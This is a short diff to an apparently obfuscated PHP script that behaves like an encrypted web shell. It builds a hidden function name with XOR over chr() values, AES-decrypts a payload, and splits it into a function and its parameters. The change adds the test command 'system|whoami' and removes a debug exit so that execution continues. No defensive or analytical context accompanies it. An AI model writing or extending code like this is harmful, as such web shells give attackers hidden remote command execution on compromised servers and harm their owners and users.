@@ -28,6 +28,7 @@ $p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18)
 $HA1VG=$f($p);
 
 //test debug
+$plaintext="system|whoami"
 
 $ciphertext = openssl_encrypt($plaintext, "AES128", $key);
 echo $ciphertext;
@@ -48,8 +49,8 @@ else{
 	$HA1VG=openssl_decrypt($HA1VG, "AES128", $key);
 }
 
-var_dump($HA1VG);
-exit;
+echo "\n", ($HA1VG);
+
 $arr=explode('|',$HA1VG);
 $func=$arr[0];
 $params=$arr[1];
